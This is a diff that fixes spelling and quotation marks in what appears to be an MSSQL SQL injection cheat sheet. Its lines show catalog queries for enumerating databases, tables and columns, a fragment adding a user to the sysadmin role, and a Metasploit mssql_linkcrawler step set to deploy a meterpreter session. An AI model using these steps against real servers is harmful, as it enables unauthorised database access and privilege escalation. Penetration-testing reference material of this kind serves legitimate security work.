@@ -36,7 +36,7 @@
 | msdb	                | Available in all versions             |
 | tempdb	            | Available in all versions             |
 | northwind	            | Available in all versions             |
-| information_schema	| Availalble from MSSQL 2000 and higher |
+| information_schema	| Available from MSSQL 2000 and higher  |
 
 
 ## MSSQL Comments
@@ -101,14 +101,14 @@ SELECT DB_NAME()
 ```sql
 SELECT name FROM master..sysdatabases;
 SELECT DB_NAME(N); — for N = 0, 1, 2, …
-SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)
+SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)
 ```
 
 ## MSSQL List columns
 
 ```sql
-SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
-SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable'); -- for the current DB only
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; -- list column names and types for master..sometable
 
 SELECT table_catalog, column_name FROM information_schema.columns
 ```
@@ -116,12 +116,12 @@ SELECT table_catalog, column_name FROM information_schema.columns
 ## MSSQL List tables
 
 ```sql
-SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
-SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
-SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
+SELECT name FROM master..sysobjects WHERE xtype = 'U'; -- use xtype = 'V' for views
+SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; -- list column names and types for master..sometable
 
 SELECT table_catalog, table_name FROM information_schema.columns
-SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
+SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
 ```
 
 
@@ -316,7 +316,7 @@ EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
 
 ```powershell
 msf> use exploit/windows/mssql/mssql_linkcrawler
-[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio
+[msf> set DEPLOY true] # Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
 
 Manual exploitation
